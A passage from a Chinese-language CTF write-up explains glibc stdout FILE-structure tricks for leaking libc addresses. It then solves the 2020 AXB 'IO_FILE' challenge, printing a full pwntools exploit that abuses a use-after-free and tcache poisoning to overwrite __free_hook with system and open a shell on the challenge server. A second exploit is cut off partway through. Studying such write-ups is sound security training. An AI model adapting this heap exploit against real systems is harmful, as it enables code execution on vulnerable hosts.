             f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span>f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">==</span> f<span class="token operator">-></span>_IO_buf_end <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">/* Buffer is really full */</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_flush</span> <span class="token punctuation">(</span>f<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
  <span class="token operator">*</span>f<span class="token operator">-></span>_IO_write_ptr<span class="token operator">++</span> <span class="token operator">=</span> ch<span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_UNBUFFERED<span class="token punctuation">)</span>
      <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_LINE_BUF<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> ch <span class="token operator">==</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">_IO_do_write</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">,</span>
              f<span class="token operator">-></span>_IO_write_ptr <span class="token operator">-</span> f<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token constant">EOF</span><span class="token punctuation">)</span>
      <span class="token keyword">return</span> <span class="token constant">EOF</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span> ch<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token function">libc_hidden_ver</span> <span class="token punctuation">(</span>_IO_new_file_overflow<span class="token punctuation">,</span> _IO_file_overflow<span class="token punctuation">)</span></code></pre>
<p>如果进入if ((f-&gt;_flags &amp; _IO_CURRENTLY_PUTTING) == 0 || f-&gt;_IO_write_base == NULL)，无论如何都会进行： f-&gt;_IO_write_base = f-&gt;_IO_write_ptr，所以下面的_IO_do_write 的to_do等于0不会执行输出，所以这里我觉得_IO_new_file_overflow 无法进行泄露<br>所以可以设置f-&gt;_flags绕过那个大的代码块。<br>进入_IO_do_write ，只要_IO_write_base小于_IO_write_ptr 就会将_IO_write_base指向的数据输出，但是里面有一个_IO_SYSSEEK，如果(fp-&gt;_IO_read_end != fp-&gt;_IO_write_base)则不进行write的系统调用</p>
<ul>
<li><strong>pwn\！：所以要实现地址泄露，如果能控制FILE结构体就只要构造：</strong><ul>
<li>fp-&gt;_IO_read_end == fp-&gt;_IO_write_base，_IO_write_base指向目标地址进行泄露</li>
<li>_flags用stdout本身的就行    </li>
</ul>
</li>
<li><strong>PWN!：如果 没有上面那么好的条件也是可以绕过_IO_SYSSEEK的执行的，如下：只要构造_flags |= _IO_IS_APPENDING即可，即修改一下_flags</strong><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">define</span> _IO_IS_APPENDING 0x100</span>
  _IO_size_t count<span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_IS_APPENDING<span class="token punctuation">)</span>
  fp<span class="token operator">-></span>_offset <span class="token operator">=</span> _IO_pos_BAD<span class="token punctuation">;</span>
<span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>fp<span class="token operator">-></span>_IO_read_end <span class="token operator">!=</span> fp<span class="token operator">-></span>_IO_write_base<span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    _IO_off64_t new_pos
  <span class="token operator">=</span> <span class="token function">_IO_SYSSEEK</span> <span class="token punctuation">(</span>fp<span class="token punctuation">,</span> fp<span class="token operator">-></span>_IO_write_base <span class="token operator">-</span> fp<span class="token operator">-></span>_IO_read_end<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>new_pos <span class="token operator">==</span> _IO_pos_BAD<span class="token punctuation">)</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
    fp<span class="token operator">-></span>_offset <span class="token operator">=</span> new_pos<span class="token punctuation">;</span>
  <span class="token punctuation">}</span></code></pre>
</li>
</ul>
<p>小结</p>
<ul>
<li>stdout写入数据的最低要求，可以覆盖stdout结构体的_IO_write_ptr几个字节(情况而定如果想控制程序执行流选择覆盖为__malloc_hook)</li>
<li>stdout地址泄露的最低要求，可以覆盖_IO_write_base几个字节(情况而定一般可以覆盖为stderr-&gt;vtable地址，来泄露libc)并且构造_flags |= _IO_IS_APPENDING<br>注意这是适用于大部分输出函数的：<pre class=" language-c"><code class="language-c">fwrite ► f <span class="token number">0</span>     7ffff7b137a0 write
 f <span class="token number">1</span>     7ffff7aa96df _IO_new_file_write<span class="token operator">+</span><span class="token number">143</span>        <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span>
 f <span class="token number">2</span>     7ffff7aa8ce3 new_do_write<span class="token operator">+</span><span class="token number">51</span>            <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span>
 f <span class="token number">3</span>     7ffff7aa9ce6 __GI__IO_file_xsputn<span class="token operator">+</span><span class="token number">390</span>    <span class="token operator">&lt;=</span><span class="token operator">==</span><span class="token operator">=</span>
 f <span class="token number">4</span>     7ffff7a9f99b fwrite<span class="token operator">+</span><span class="token number">219</span>
<span class="token function">printf</span> <span class="token punctuation">(</span>simple<span class="token punctuation">)</span>
► f <span class="token number">0</span>     7ffff7b137a0 write
 f <span class="token number">1</span>     7ffff7aa96df _IO_new_file_write<span class="token operator">+</span><span class="token number">143</span>
 f <span class="token number">2</span>     7ffff7aa8ce3 new_do_write<span class="token operator">+</span><span class="token number">51</span>
f <span class="token number">3</span>     7ffff7aa9ce6 __GI__IO_file_xsputn<span class="token operator">+</span><span class="token number">390</span>
f <span class="token number">4</span>     7ffff7aa0918 puts<span class="token operator">+</span><span class="token number">168</span>  
puts
► f <span class="token number">0</span>     7ffff7b137a0 write
 f <span class="token number">1</span>     7ffff7aa96df _IO_new_file_write<span class="token operator">+</span><span class="token number">143</span>
 f <span class="token number">2</span>     7ffff7aa8ce3 new_do_write<span class="token operator">+</span><span class="token number">51</span>
 f <span class="token number">3</span>     7ffff7aa9ce6 __GI__IO_file_xsputn<span class="token operator">+</span><span class="token number">390</span>
 f <span class="token number">4</span>     7ffff7aa0918 puts<span class="token operator">+</span><span class="token number">168</span></code></pre>
这三个的调用流程是一模一样的，稍微不一样的记得先看看源码对比一下</li>
</ul>
<h2 id="2020–AXB–IO-FILE"><a href="#2020–AXB–IO-FILE" class="headerlink" title="2020–AXB–IO_FILE"></a>2020–AXB–IO_FILE</h2><pre class=" language-java"><code class="language-java">checksec
<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/home/matrix/PWN/AXB/IO_FILE/attachment/IO_FILE'</span>
    Arch<span class="token operator">:</span>     amd64<span class="token operator">-</span><span class="token number">64</span><span class="token operator">-</span>little
    RELRO<span class="token operator">:</span>    Partial RELRO
    Stack<span class="token operator">:</span>    No canary found
    NX<span class="token operator">:</span>       NX enabled
    PIE<span class="token operator">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x3ff000</span><span class="token punctuation">)</span></code></pre>
<p>只开起了NX</p>
<h3 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h3><p>整个程序就只有add，delete，和exit，那么要泄露地址应该要通过IO攻击，这让我深刻明白我的IO学的有多烂，所以就自己跟了一次源码</p>
<pre class=" language-c"><code class="language-c">      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">2</span> <span class="token punctuation">)</span>
        <span class="token keyword">break</span><span class="token punctuation">;</span>
      <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token comment" spellcheck="true">// 只free了description_chunk未进行指针置零</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">3</span> <span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"bye bye "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">1</span> <span class="token punctuation">)</span>
      <span class="token function">add</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                    <span class="token comment" spellcheck="true">// malloc(0x10)指针记录在bss段</span>
    <span class="token keyword">else</span></code></pre>
<p>关键在del函数未进行指针置零：</p>
<pre class=" language-c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">del</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> index<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+Ch] [rbp-4h]</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"index:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  index <span class="token operator">=</span> <span class="token function">read_num</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> index <span class="token operator">></span> <span class="token number">9</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Invalid index"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token function">free</span><span class="token punctuation">(</span><span class="token operator">*</span>heap<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//&lt;===============</span>
<span class="token punctuation">}</span></code></pre>
<p>环境是glibc2.27那么这个题考察的就是tcache和IO的漏洞配合</p>
<p>数据结构：<br><img src="" alt=""></p>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>从要在tcache中泄露libc地址，方法很明确就是free8次，恰好这里指针未置零。先add一个较大的chunk(add(0xa0)，和一个fastbin小chunk(add(0x10))防止于topchunk合并。free第一个chunk8次后：</p>
<pre class=" language-java"><code class="language-java">tcachebins
<span class="token number">0xb0</span> <span class="token punctuation">[</span>  <span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x16fc280</span> —<span class="token operator">></span> <span class="token function">0x7fde0299fca0</span> <span class="token punctuation">(</span>main_arena<span class="token operator">+</span><span class="token number">96</span><span class="token punctuation">)</span> —<span class="token operator">></span> <span class="token number">0x16fc370</span> <span class="token operator">&lt;</span>— <span class="token number">0x0</span></code></pre>
<p>之后再次进行add(0x10)，由于tcache，fastbin，smallbin中都没有一样的chunk，而unsortedbin中的chunk不可切割(因为unsorted bin中有且仅有一个last remainder才可以进行切割)，所以触发unsortedbin遍历放入smallbin中，由于在largbin中没有合适的chunk进行map遍历，获取smallbin中的那个chunk并进行切割(0x20)，剩下的放入unsortedbin（有且仅有一个last remainder）之后的切割对unsortedbin进行。所以add(0x10)会在第一个chunk中一共切割出0x40的空间，而且是将其看作非tcache chunk进行的，所以就篡改了tcachebins 0xb0的指向，所以将main_arena+96指针覆盖为指向<em>IO_2_1_stdout</em>(add(0x10,’\x60\x37’))：</p>
<pre class=" language-java"><code class="language-java">tcachebins#显然这里需要爆破一位数，可以在本地关闭ASLR
<span class="token number">0xb0</span> <span class="token punctuation">[</span>  <span class="token number">7</span><span class="token punctuation">]</span><span class="token operator">:</span> <span class="token number">0x603280</span> —<span class="token operator">></span> <span class="token number">0x6032a0</span> —<span class="token operator">></span> <span class="token function">0x7ffff7dd3760</span> <span class="token punctuation">(</span>_IO_2_1_stdout_<span class="token punctuation">)</span> <span class="token operator">&lt;</span>— <span class="token number">0xfbad2887</span></code></pre>
<p>然后获取_IO_2_1_stdout_写入权后，覆盖_IO_write_base的最后一位指向_IO_2_1_stderr-&gt;vtable，达到泄露的目的。需要注意的是在进行覆盖时我们不知道libc地址所以只能进行最差条件下的覆盖，即如下伪造：</p>
<pre class=" language-c"><code class="language-c"><span class="token function">_flags</span><span class="token punctuation">(</span>原flags<span class="token punctuation">)</span> <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">_IO_IS_APPENDING</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span>  #绕过SYSSEEK
_flags <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">_IO_CURRENTLY_PUTTING</span><span class="token punctuation">(</span><span class="token number">0x800</span><span class="token punctuation">)</span>  #绕过_IO_OVERFLOW 的<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token operator">-></span>_flags <span class="token operator">&amp;</span> _IO_CURRENTLY_PUTTING<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">||</span> f<span class="token operator">-></span>_IO_write_base <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> </code></pre>
<p><strong>在进行泄露地址之前，将index 4的chunksize位覆盖为0xf1，这样我们释放它时就不会放入那个已经free8次的链表中</strong>，可以进行tcache攻击控制程序执行流。</p>
<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#+++++++++++++++++++exp.py++++++++++++++++++++</span>
<span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-                           </span>
<span class="token comment" spellcheck="true">#Author: Squarer</span>
<span class="token comment" spellcheck="true">#Time: 2020.11.25 19.48.14</span>
<span class="token comment" spellcheck="true">#+++++++++++++++++++exp.py++++++++++++++++++++</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
<span class="token keyword">from</span> FILE <span class="token keyword">import</span><span class="token operator">*</span>

context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>\n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'description:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>cont<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>\n'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>\n'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show_addr</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'The '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' Addr:'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

host <span class="token operator">=</span> <span class="token string">'1.1.1.1'</span>
port <span class="token operator">=</span> <span class="token number">10000</span>
local <span class="token operator">=</span> <span class="token number">0</span>
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
    libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/glibc/x64/2.27/lib/libc-2.27.so'</span><span class="token punctuation">)</span>
    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./IO_FILE'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#sh = process('./IO_FILE')</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
    libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>
    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./IO_FILE'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#sh = remote('axb.d0g3.cn',20102)</span>

<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token comment" spellcheck="true">#usefull : add delete </span>
    add<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">)</span>          <span class="token comment" spellcheck="true">#0</span>
    add<span class="token punctuation">(</span><span class="token number">0x20</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0xdeadbeef</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#1  防止合并</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>            <span class="token comment" spellcheck="true">#0xb0</span>
    add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">'\x60\x37'</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#2</span>
    add<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">'/bin/sh\x00'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xf1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad3887</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span> <span class="token operator">+</span> p8<span class="token punctuation">(</span><span class="token number">0x58</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0xa0</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span>
    libc_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_file_jumps'</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>libc_addr <span class="token operator">==</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_file_jumps'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    free_hook <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
    malloc_hook <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>
    system_addr <span class="token operator">=</span> libc_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
    show_addr<span class="token punctuation">(</span><span class="token string">'malloc_hook'</span><span class="token punctuation">,</span>malloc_hook<span class="token punctuation">)</span>
    show_addr<span class="token punctuation">(</span><span class="token string">'free_hook'</span><span class="token punctuation">,</span>free_hook<span class="token punctuation">)</span>
    show_addr<span class="token punctuation">(</span><span class="token string">'system_addr'</span><span class="token punctuation">,</span>system_addr<span class="token punctuation">)</span>
    show_addr<span class="token punctuation">(</span><span class="token string">'libc_addr'</span><span class="token punctuation">,</span>libc_addr<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        delete<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">,</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0xe0</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token triple-quoted-string string">'''
Fake chunk | Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA
Addr: 0x7ffff7dd2c0d
prev_size: 0x7f
size: 0x7f
fd: 0x00
'''</span>    

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'axb.d0g3.cn'</span><span class="token punctuation">,</span><span class="token number">20102</span><span class="token punctuation">)</span>
            pwn<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            sh<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
<h3 id="Official-EXP"><a href="#Official-EXP" class="headerlink" title="Official EXP"></a>Official EXP</h3><p>其实这题应该是我的思路狭窄了，只想到了unsortedbin chunk获取libc地址，在关闭缓冲区时，其实bss段中的全局变量就已经包含了libc地址，所以最恰当的做法是double free后篡改链表到bss段<br>获取stdout_chunk,泄露libc，再次double free向free_hook写入system</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#+++++++++++++++++++exp.py++++++++++++++++++++</span>
<span class="token comment" spellcheck="true">#!/usr/bin/python</span>
<span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-                           </span>
<span class="token comment" spellcheck="true">#Author: Squarer</span>
<span class="token comment" spellcheck="true">#Time: 2020.11.25 19.48.14</span>
<span class="token comment" spellcheck="true">#+++++++++++++++++++exp.py++++++++++++++++++++</span>
<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
<span class="token keyword">from</span> FILE <span class="token keyword">import</span><span class="token operator">*</span>

context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>

<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span>cont<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>\n'</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:\n'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>str<span class="token punctuation">(</span>cont<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>\n'</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index:'</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sh<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'>\n'</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">show_addr</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
        log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'The '</span><span class="token operator">+</span>str<span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">' Addr:'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


host <span class="token operator">=</span> <span class="token string">'1.1.1.1'</span>
port <span class="token operator">=</span> <span class="token number">10000</span>
local <span class="token operator">=</span> <span class="token number">1</span>
<span class="token keyword">if</span> local<span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
    libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'/glibc/x64/2.27/lib/libc-2.27.so'</span><span class="token punctuation">)</span>
    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./IO_FILE'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#sh = process('./IO_FILE')</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
    libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'libc.so.6'</span><span class="token punctuation">)</span>
    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./IO_FILE'</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#sh = remote('axb.d0g3.cn',20102)</span>

<span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
<span class="token comment" spellcheck="true">#usefull : add delete </span>
    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'\n'</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0x602080</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'\x40'</span><span class="token punctuation">)</span>
    add<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">,</span><span class="token string">'\x40'</span><span class="token punctuation">)</span>
